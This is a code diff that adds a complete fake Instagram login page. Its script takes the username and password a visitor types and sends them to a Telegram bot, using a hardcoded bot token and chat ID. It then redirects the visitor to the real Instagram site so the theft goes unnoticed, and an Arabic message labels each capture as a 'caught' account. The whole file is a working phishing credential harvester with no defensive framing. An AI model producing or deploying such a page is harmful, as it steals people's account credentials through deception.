@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 30px; width: 300px; text-align: center; border-radius: 5px; }
+        h1 { font-family: 'Billabong', cursive; font-size: 40px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 5px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var user = document.getElementById('username').value;
+            var pass = document.getElementById('password').value;
+            
+            var botToken = "9215357984:AAHQXKILrJwfySge9SqTGh9Jgf5CJJbm-pY";
+            var chatId = "8519722250";
+            
+            var message = "🎯 **تم صيد حساب!**\n\n👤 اليوزر: `" + user + "`\n🔑 الباسوورد: `" + pass + "`";
+            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
+            
+            fetch(url).then(() => {
+                window.location.href = "https://www.instagram.com";
+            }).catch(() => {
+                window.location.href = "https://www.instagram.com";
+            });
+        });
+    </script>
+</body>
+</html>
